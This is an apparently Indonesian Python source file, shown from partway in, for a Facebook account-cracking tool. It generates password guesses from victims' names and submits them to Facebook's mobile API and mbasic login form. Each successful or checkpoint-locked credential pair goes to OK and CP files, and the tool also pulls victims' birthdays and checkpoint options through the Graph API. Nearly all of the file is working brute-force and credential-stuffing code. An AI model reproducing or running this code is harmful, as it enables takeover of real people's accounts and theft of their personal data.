				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(mbasic, idd, past, loop)

# CRACK API

def api(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open("user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	print(s+"\r["+l+"Crack"+s+"] "+l+"%s/%s [OK:%s] [CP:%s] %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),s,l,persen,s,l,dett,s), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			response = requests.get(api, params=params, headers=headers_)
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(h+"\r["+k+"ok"+h+"]"+h+" "+uid+k+" • "+h+pw+k+" • "+h+tahunnya+"          ")
					bts = open("OK/OK_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(h+"\r["+k+"ok"+h+"]"+h+" "+uid+k+" • "+h+pw+k+" • "+h+response.json()["access_token"])
					bts = open("OK/OK_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+k+" • "+l+tahunnya)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" • "+l+tahunnya)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+tahunnya+"                ")
							bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+"                  ")
							bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CRACK MBASIC

def mbasic(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open("user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	print(s+"\r["+l+"Crack"+s+"] "+l+"%s/%s [OK:%s] [CP:%s] %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),s,l,persen,s,l,dett,s), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://mbasic.facebook.com")
			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(h+"\r["+k+"ok"+h+"]"+h+" "+uid+k+" • "+h+pw+k+" • "+h+tahunnya+"          ")
					bts = open("OK/OK_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(h+"\r["+k+"ok"+h+"]"+h+" "+uid+k+" • "+h+pw+k+" • "+h+kuki)
					bts = open("OK/OK_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+k+" • "+l+tahunnya)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" • "+l+tahunnya)
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+tahunnya+"          ")
							bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(h+"\r["+k+"cp"+h+"]"+l+" "+uid+k+" • "+l+pw+"          ")
							bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CEKER OPSI

def ceker(uid,pw,ua,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "old" in old_gak:
			print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+tahunnya+"          ")
			bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		else:
			print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+"          ")
			bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+s+"Horee....Tap Yes Nih Bos")
		print("\r"+h+batas)

def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if len(lahir)==2:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+k+" • "+l+tahunnya)
				bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan)
				bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
		else:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" • "+l+tahunnya)
				bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r["+l+"cp"+s+"]"+l+" "+uid+k+" • "+l+pw+k+" • "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
				bts = open("CP/CP_%s.txt"%(hck),"a");bts.write(uid+"•"+pw+"•"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+s+"Horee...Tap Yes Nih Bos")
		print("\r"+h+batas)

# CEK OPSI

def cek_opsi():
	loop = 0
	print("\n"+balmond+l+" Masukkan Nama File")
	print(balmond+l+" Contoh : "+k+"CP/CP_%s.txt"%(hck))
	inp = input(balmond+l+" Nama File : "+s)
	try:
		tes = open(inp,"r").readlines()
	except IOError:
		jalan("\n"+balmond+m+" File Tidak Ada")
		time.sleep(0.5)
		menu()
	print(balmond+l+" Terdapat : "+k+"%s Akun"%(len(tes)))
	print("")
	for cinta in tes:
		loop+=1
		sayang = cinta.replace("\n","")
		gemes = sayang.split(">")
		yaudah(gemes[0],gemes[1],loop,tes)

# GAK TAU

def yaudah(user,pasw,loop,tes):
	mb = ("https://mbasic.facebook.com")
	try:
		ua = open("user.txt","r").read()
	except IOError:
		ua = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11"
	ses = requests.Session()
	print(s+"\r["+l+"CEK"+s+"] "+l+"[%s] Dari [%s]"%(loop,len(tes)), end=' ');sys.stdout.flush()
	try:
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		data = {}
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies:
			print(s+"\r["+l+"ok"+s+"]"+h+" "+user+k+" • "+h+pasw)
			print(h+batas)
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			print(s+"\r["+l+"cp"+s+"]"+l+" "+user+k+" • "+l+pasw)
			for opt in range(len(ngew)):
				print("\r"+balmond+l+"   "+ngew[opt])
			if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+s+"Horee...Tap Yes Nih Bos")
			print(h+batas)
		else:
			print(s+"\r["+l+"ex"+s+"]"+m+" "+user+k+" • "+m+pasw)
			print(h+batas)
	except requests.exceptions.ConnectionError:
		time.sleep(31)
	

if __name__ == "__main__":
	os.system("git pull")
	menu()
